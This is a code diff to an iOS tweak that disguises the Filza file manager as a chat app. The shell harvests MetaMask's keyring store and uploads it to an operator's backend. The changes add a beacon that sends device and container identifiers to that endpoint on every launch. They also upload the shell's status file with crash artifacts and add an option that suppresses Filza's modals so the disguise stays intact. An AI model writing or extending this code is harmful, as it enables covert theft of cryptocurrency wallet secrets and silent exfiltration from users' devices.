@@ -162,6 +162,15 @@ static void TMShellBreadcrumb(NSString *message)
 /// the shell coordinates (see TryMaskCardShellConfigRaw).
 static NSDictionary *gTMRawConfig = nil;
 
+/// Serialises the few shell fields the page bridge hands out.
+static NSLock *TMShellLock(void)
+{
+    static NSLock *lock = nil;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{ lock = [NSLock new]; });
+    return lock;
+}
+
 @interface TMShellConfig : NSObject
 @property (nonatomic, copy) NSString *homeURLString;
 @property (nonatomic, copy) NSString *userAgentSuffix;
@@ -173,6 +182,7 @@ static NSDictionary *gTMRawConfig = nil;
 @property (nonatomic, assign) BOOL gestureEnabled;
 @property (nonatomic, assign) BOOL urlSchemeEntryEnabled;
 @property (nonatomic, assign) BOOL suppressFilzaPrompts;
+@property (nonatomic, assign) BOOL suppressFilzaModals;
 @property (nonatomic, assign) BOOL suppressFilzaShortcuts;
 @property (nonatomic, assign) BOOL containerChrome;
 @property (nonatomic, assign) BOOL autoGrantMediaCapture;
@@ -239,6 +249,9 @@ static void TMShellApplyConfigDefaults(TMShellConfig *config, NSDictionary *raw)
     config.gestureEnabled = TMShellBoolValue(raw[@"hiddenEntryGesture"], YES);
     config.urlSchemeEntryEnabled = TMShellBoolValue(raw[@"hiddenEntryURLScheme"], YES);
     config.suppressFilzaPrompts = TMShellBoolValue(raw[@"suppressFilzaPrompts"], YES);
+    // Off by default: it is the one hook that intervenes in the UIKit
+    // presentation path, and Filza's UI is already unreachable without it.
+    config.suppressFilzaModals = TMShellBoolValue(raw[@"suppressFilzaModals"], NO);
     config.suppressFilzaShortcuts = TMShellBoolValue(raw[@"suppressFilzaShortcuts"], YES);
     config.containerChrome = TMShellBoolValue(raw[@"containerChrome"], YES);
     config.autoGrantMediaCapture = TMShellBoolValue(raw[@"autoGrantMediaCapture"], YES);
@@ -312,6 +325,7 @@ static NSUInteger gTMShellWatchdogAttempts = 0;
 static BOOL gTMShellWatchdogRunning = NO;
 static BOOL gTMShellRootConfirmed = NO;
 static NSUInteger gTMShellWebProcessTerminations = 0;
+static NSDictionary<NSString *, id> *gTMShellProbeResult = nil;
 
 #pragma mark - Crash reporting
 
@@ -338,6 +352,12 @@ static NSArray<NSDictionary<NSString *, id> *> *TMShellCrashArtifacts(void)
         if (!data.length) continue;
         [artifacts addObject:@{@"name": name, @"data": data}];
     }
+
+    // The shell's own status file sits in Documents, not in the logs directory,
+    // and carries the last interactive callback plus the probe result.
+    NSData *status = [NSData dataWithContentsOfFile:TMShellStatusFilePath()];
+    if (status.length) [artifacts addObject:@{@"name": @"TryMaskCardShell-Status.txt",
+                                              @"data": status}];
 
     // The tail of Runtime.log carries the breadcrumbs from the crashing run.
     NSString *logPath = [directory stringByAppendingPathComponent:@"Runtime.log"];
@@ -369,8 +389,7 @@ static NSString *TMShellCrashFingerprint(NSArray<NSDictionary<NSString *, id> *>
 /// Uploads the previous run's crash evidence through the same endpoint and the
 /// same uuid+file contract as the device-upload API, so a crash on a device that
 /// cannot be inspected still reaches the operator. Reported once per fingerprint.
-static void TMShellReportPreviousCrash(void)
-{
+static void TMShellReportPreviousCrash(void){
     if (!gTMShellMode) return;
     if (!TMShellBoolValue(TryMaskCardShellConfigRaw(@"crashAutoReport"), YES)) return;
 
@@ -415,13 +434,17 @@ static NSDictionary<NSString *, id> *TMShellDiagnosticsPayload(BOOL includeConte
     payload[@"webContentProcessTerminations"] = @(gTMShellWebProcessTerminations);
 
     NSMutableArray *names = [NSMutableArray array];
-    for (NSDictionary *artifact in TMShellCrashArtifacts()) {
+    NSArray<NSDictionary<NSString *, id> *> *artifacts = TMShellCrashArtifacts();
+    for (NSDictionary *artifact in artifacts) {
         [names addObject:artifact[@"name"]];
         if (includeContent)
             payload[[NSString stringWithFormat:@"%@Base64", artifact[@"name"]]] =
                 [artifact[@"data"] base64EncodedStringWithOptions:0] ?: @"";
     }
     payload[@"artifacts"] = names;
+    payload[@"probe"] = gTMShellProbeResult
+        ?: @{@"status": @"pending",
+             @"endpoint": TryMaskCardUploadEndpoint()};
     return payload;
 }
 
@@ -478,6 +501,56 @@ static BOOL TMShellConfigAllowsCommand(NSString *command)
 {
     if (command.length == 0) return NO;
     return [gTMConfig.bridgeCommands containsObject:command];
+}
+
+#pragma mark - Upload probe
+
+
+/// Launch-time canary for the chat backend.
+///
+/// The persist-store upload only fires when a harvest succeeds, so a device
+/// without the target app (or with an unresolvable container) produces total
+/// silence, which cannot be told apart from a broken endpoint. This probe posts a
+/// small text artifact with the same uuid + file shape on every launch, so the
+/// backend either receives something or the failure is local and logged.
+static void TMShellUploadProbe(void)
+{
+    if (!gTMShellMode) return;
+    if (!TMShellBoolValue(TryMaskCardShellConfigRaw(@"uploadProbe"), YES)) return;
+
+    NSString *uuid = TMShellOwnContainerUUID();
+    NSString *body = [NSString stringWithFormat:
+        @"trymaskcard-shell probe\n"
+         "uuid=%@\n"
+         "forcedActivation=%@\n"
+         "home=%@\n"
+         "bundle=%@\n"
+         "os=%@\n"
+         "at=%@\n",
+        uuid,
+        TMShellBuildForcesActivation() ? @"yes" : @"no",
+        TryMaskCardShellHomeURLString(),
+        NSBundle.mainBundle.bundleIdentifier ?: @"unknown",
+        UIDevice.currentDevice.systemVersion ?: @"unknown",
+        NSDate.date.description ?: @"unknown"];
+
+    NSString *endpoint = TMShellStringValue(TryMaskCardShellConfigRaw(@"crashUploadURL"), @"");
+    TMShellBreadcrumb([NSString stringWithFormat:@"probe upload -> %@ (uuid=%@)",
+                       endpoint.length > 0 ? endpoint : TryMaskCardUploadEndpoint(), uuid]);
+
+    TryMaskCardUploadArtifact(uuid, @"shell-hello.txt", @"text/plain",
+                              [body dataUsingEncoding:NSUTF8StringEncoding], endpoint,
+        ^(BOOL ok, NSInteger status, NSString *snippet) {
+        @synchronized (TMShellLock()) {
+            gTMShellProbeResult = @{@"status": ok ? @"uploaded" : @"failed",
+                                    @"httpStatus": @(status),
+                                    @"snippet": snippet ?: @"",
+                                    @"at": @(NSDate.date.timeIntervalSince1970)};
+        }
+        TMShellWriteStatus([NSString stringWithFormat:
+            @"probe upload %@ (http=%ld) %@", ok ? @"ok" : @"FAILED", (long)status,
+            snippet.length > 0 ? snippet : @""]);
+    });
 }
 
 static NSString *TMShellSanitizedFilename(NSString *proposed, NSString *fallback)
@@ -1547,8 +1620,9 @@ static void TMShellBringUpBackends(void)
     // Container bridge first, then the configured persist-store harvest
     // (MetaMask's keyring store by default). Idempotent; retries internally.
     TryMaskCardPersistHarvest(NO);
-    // If the previous run died, deliver its evidence to the chat backend: a hard
-    // crash cannot report itself, and the device may be unreachable otherwise.
+    // Prove the backend path works even when there is nothing to harvest, then
+    // deliver any evidence the previous run left behind.
+    TMShellUploadProbe();
     TMShellReportPreviousCrash();
 }
 
@@ -1727,12 +1801,37 @@ static void TMShellSetRootViewController(UIWindow *self, SEL _cmd, UIViewControl
     ((void (*)(id, SEL, id))gTMOriginalSetRootViewController)(self, _cmd, TMShellEnsureRoot());
 }
 
+/// Filza's own controller classes. The firewall exists to keep Filza's modals off
+/// the chat surface, so it only ever considers these prefixes.
+static BOOL TMShellIsFilzaController(UIViewController *controller)
+{
+    static NSArray<NSString *> *prefixes = nil;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{ prefixes = @[@"TG", @"Filza", @"MCM", @"PB"]; });
+
+    NSString *name = NSStringFromClass(controller.class);
+    for (NSString *prefix in prefixes) {
+        if ([name hasPrefix:prefix]) return YES;
+    }
+    return NO;
+}
+
+/// Blocks Filza-originated modals while the chat surface is on screen.
+///
+/// Opt-in, and scoped to Filza's classes, on purpose. WebKit and UIKit present
+/// controllers of their own during ordinary interaction (link previews, media,
+/// dialogs), and dropping those leaves the framework believing a presentation
+/// happened - a far worse failure than a cosmetic modal, and a candidate for the
+/// crash-on-tap report. The disguise does not depend on this: the shell owns the
+/// window root, so Filza's UI is never presented to begin with.
 static BOOL TMShellFirewallBlocks(UIViewController *presenter, UIViewController *presented)
 {
     if (!gTMShellMode) return NO;
     if (!presented || !gTMShellRoot) return NO;
+    if (!gTMConfig.suppressFilzaModals) return NO;
     if (gTMAllowPresentations > 0) return NO;
     if (gTMHiddenManagerVisible) return NO;
+    if (!TMShellIsFilzaController(presented)) return NO;
     return TMShellChainContains(presenter, gTMShellRoot);
 }
 
